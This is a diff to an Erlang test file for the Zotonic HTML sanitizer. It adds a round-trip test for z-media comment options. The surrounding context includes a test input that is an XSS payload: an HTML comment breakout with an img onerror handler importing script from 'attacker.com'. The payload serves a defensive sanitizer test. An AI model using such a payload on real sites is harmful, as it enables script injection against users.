@@ -57,6 +57,19 @@ zmedia_test() ->
         <<"align">> := <<"block">>
     } = jsxrecord:decode(<<"{", JSON/binary, "}">>).
 
+zmedia_class_roundtrip_test() ->
+    lists:foreach(
+        fun(Options) ->
+            In = <<"<!-- z-media 123 ", (z_json:encode(Options))/binary, " -->">>,
+            Sanitized = z_sanitize:html(In),
+            <<"<!-- z-media 123 ", Rest/binary>> = Sanitized,
+            [Json, <<>>] = binary:split(Rest, <<" -->">>),
+            ?assertEqual(Options, z_json:decode(Json)),
+            ?assertEqual(Sanitized, z_sanitize:html(Sanitized))
+        end,
+        [#{<<"class">> => <<"custom-image-style">>}, #{<<"class">> => <<>>}, #{}]
+    ).
+
 comment_test() ->
     Context = z_context:new(zotonic_site_testsandbox),
     In = <<"<!--data-mce-selected=\"x\"->\"><img src onerror=import('//attacker.com')>-->">>,
